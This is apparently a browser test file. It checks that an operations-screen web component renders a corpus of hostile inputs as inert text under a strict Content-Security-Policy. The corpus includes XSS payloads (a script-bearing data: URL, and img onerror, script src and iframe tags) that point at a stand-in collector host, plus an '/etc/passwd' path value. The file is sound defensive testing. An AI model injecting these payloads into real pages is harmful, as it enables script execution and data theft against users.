// T045 (NFR-005): the hostile corpus. Markup, `javascript:` and `data:` addresses, a protocol-relative address, an unbroken 512
// character token, bidirectional overrides and a value that looks like a path are rendered inside a page whose CSP meta forbids
// every load, with a `securitypolicyviolation` observer and a resource-timing observer. The screen must draw them as inert text:
// 0 violations, 0 requests, no live element made from the text. The harness is proven by positive controls: a scratch image loaded
// without the policy is a request the observer sees, and the same image under the policy is a violation the observer sees.
// The no-policy control runs FIRST, because a CSP meta cannot be removed from a document once it is inserted.
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { page } from 'vitest/browser';
import '@spec-kitty/tokens';
import '../src/index.js';
import type { SkOpsScreen } from '../src/elements/sk-ops-screen/sk-ops-screen.js';
import { OPS_INVOCATION_FIXTURES, opsProps } from '../src/elements/sk-ops-screen/fixtures.js';
import type { OpsInvocationView } from '../src/contract/types.js';

const frames = () => new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(() => resolve(null))));
const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

const violations: SecurityPolicyViolationEvent[] = [];
const requests: string[] = [];
document.addEventListener('securitypolicyviolation', (event) => violations.push(event));
new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) requests.push(entry.name);
}).observe({ type: 'resource', buffered: false });

afterEach(() => {
  document.body.replaceChildren();
});

const base = OPS_INVOCATION_FIXTURES.opsOpen;
const withEvidence = (n: number, kind: string, value: string, over: Partial<OpsInvocationView> = {}): OpsInvocationView => ({
  ...structuredClone(base),
  invocationId: `01K6TZHOSTILE${String(n).padStart(13, '0')}`,
  evidence: { kind, value, redacted: false },
  ...over,
});

/** The corpus: every hostile shape, in evidence, in the profile and in the action, as test-only inputs (a cast of the contract rows). */
const CORPUS_VALUES = {
  markup: OPS_INVOCATION_FIXTURES.opsEvidenceMarkup.evidence?.value as string,
  javascript: OPS_INVOCATION_FIXTURES.opsEvidenceJavascriptUrl.evidence?.value as string,
  data: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  protocolRelative: '//collector.example.invalid/pixel.gif?x=1',
  unbroken512: OPS_INVOCATION_FIXTURES.opsEvidenceUnbroken512.evidence?.value as string,
  bidi: OPS_INVOCATION_FIXTURES.opsEvidenceBidi.evidence?.value as string,
  pathLike: '/etc/passwd',
};

function corpusItems(): OpsInvocationView[] {
  const items: OpsInvocationView[] = [
    withEvidence(1, 'text', CORPUS_VALUES.markup),
    withEvidence(2, 'url', CORPUS_VALUES.javascript),
    withEvidence(3, 'url', CORPUS_VALUES.data),
    withEvidence(4, 'url', CORPUS_VALUES.protocolRelative),
    withEvidence(5, 'text', CORPUS_VALUES.unbroken512),
    withEvidence(6, 'text', CORPUS_VALUES.bidi),
    withEvidence(7, 'repo_path', CORPUS_VALUES.pathLike),
    withEvidence(8, 'text', 'plain', { profileId: '<img src=//collector.example.invalid/p.gif onerror=alert(1)>', action: '<script src=//collector.example.invalid/a.js></script>', actor: '"><iframe src=//collector.example.invalid/f>' }),
  ];
  return items;
}

async function mount(props: Parameters<typeof Object.assign>[1]): Promise<SkOpsScreen> {
  await page.viewport(1280, 900);
  const screen = document.createElement('sk-ops-screen');
  Object.assign(screen, props);
  const box = document.createElement('div');
  document.body.append(box);
  box.append(screen);
  await screen.updateComplete;
  await frames();
  await wait(150);
  return screen;
}

const SCRATCH = (name: string): string => `${location.origin}/__ops-hostile-control-${name}.png`;

describe('the harness sees a request (no policy yet; positive control, first)', () => {
  it('a scratch image is a resource entry the observer records, and no violation', async () => {
    const requestsBefore = requests.length;
    const violationsBefore = violations.length;
    const img = document.createElement('img');
    img.src = SCRATCH('network');
    const box = document.createElement('div');
    box.append(img);
    document.body.append(box);
    await wait(400);
    expect(requests.slice(requestsBefore).filter((name) => name.includes('__ops-hostile-control-network'))).toHaveLength(1);
    expect(violations.length - violationsBefore).toBe(0);
  });
});

describe('under a CSP that forbids every load', () => {
  let meta: HTMLMetaElement;
  beforeAll(() => {
    meta = document.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = "default-src 'none'; style-src 'unsafe-inline'; font-src 'self'";
    document.head.append(meta);
  });
  afterAll(() => undefined);

  it('the harness sees a violation: the same scratch image under the policy is exactly one violation (positive control)', async () => {
    const before = violations.length;
    const img = document.createElement('img');
    img.src = SCRATCH('policy');
    const box = document.createElement('div');
    box.append(img);
    document.body.append(box);
    await wait(400);
    const seen = violations.slice(before);
    expect(seen).toHaveLength(1);
    expect(seen[0]?.effectiveDirective).toBe('img-src');
    expect(seen[0]?.blockedURI).toContain('__ops-hostile-control-policy');
  });

  it('the corpus renders with 0 violations, 0 requests, and nothing live made from the text', async () => {
    const violationsBefore = violations.length;
    const requestsBefore = requests.length;
    const screen = await mount({ ...opsProps.ready(), items: corpusItems(), totalCount: 8 });
    const root = screen.shadowRoot as ShadowRoot;
    expect(root.querySelectorAll('li[data-row-id]')).toHaveLength(8);
    expect(violations.length - violationsBefore).toBe(0);
    expect(requests.slice(requestsBefore).filter((name) => !name.includes('/@vite') && !name.includes('node_modules'))).toEqual([]);
    // Inert: no element, attribute or address was made from any value.
    for (const selector of ['img', 'script', 'iframe', 'object', 'embed', 'a[href]', '[src]', '[srcset]', '[onerror]', '[onclick]', 'form', 'base', 'link']) {
      expect(root.querySelectorAll(selector), selector).toHaveLength(0);
    }
    // The text is there, as text: the markup string, the javascript address, the data address, the protocol-relative one and the path.
    const rows = [...root.querySelectorAll<HTMLElement>('li[data-row-id]')];
    const shown = rows.map((r) => r.textContent ?? '').join('\n');
    for (const value of [CORPUS_VALUES.markup, CORPUS_VALUES.javascript, CORPUS_VALUES.data, CORPUS_VALUES.protocolRelative, CORPUS_VALUES.pathLike, CORPUS_VALUES.unbroken512]) {
      expect(shown).toContain(value);
    }
    expect(rows[7]?.textContent).toContain('<img src=//collector.example.invalid/p.gif onerror=alert(1)>');
  });

  it('the bidirectional override is isolated: the value sits in a bdi, and the row text order outside it is unchanged', async () => {
    const screen = await mount({ ...opsProps.ready(), items: [withEvidence(6, 'text', CORPUS_VALUES.bidi)], totalCount: 1 });
    const root = screen.shadowRoot as ShadowRoot;
    const value = root.querySelector('[data-evidence-value]') as HTMLElement;
    expect(value.querySelectorAll('bdi')).toHaveLength(1);
    expect(value.textContent).toContain('‮');
    expect(getComputedStyle(value.querySelector('bdi') as HTMLElement).unicodeBidi).toBe('isolate');
    // The facts order is the DOM order: the evidence term is after the Started term (nothing reordered the row).
    const terms = [...root.querySelectorAll('dt')].map((t) => t.textContent?.trim());
    expect(terms.indexOf('Started')).toBeLessThan(terms.indexOf('Evidence'));
  });

  it('the unbroken 512-character token stays inside its row (no horizontal overflow of the cell)', async () => {
    const screen = await mount({ ...opsProps.ready(), items: [withEvidence(5, 'text', CORPUS_VALUES.unbroken512)], totalCount: 1 });
    const root = screen.shadowRoot as ShadowRoot;
    const cell = root.querySelector('[data-ops-cell]') as HTMLElement;
    expect(CORPUS_VALUES.unbroken512).toHaveLength(512);
    expect(cell.scrollWidth).toBeLessThanOrEqual(cell.clientWidth);
    const row = root.querySelector('li[data-row-id]') as HTMLElement;
    expect(row.scrollWidth).toBeLessThanOrEqual(row.clientWidth);
  });

  it('the policy is still enforced at the end: one more scratch image is one more violation (control against a silent observer)', async () => {
    const before = violations.length;
    const img = document.createElement('img');
    img.src = SCRATCH('end');
    document.body.append(img);
    await wait(400);
    expect(violations.length - before).toBe(1);
  });
});
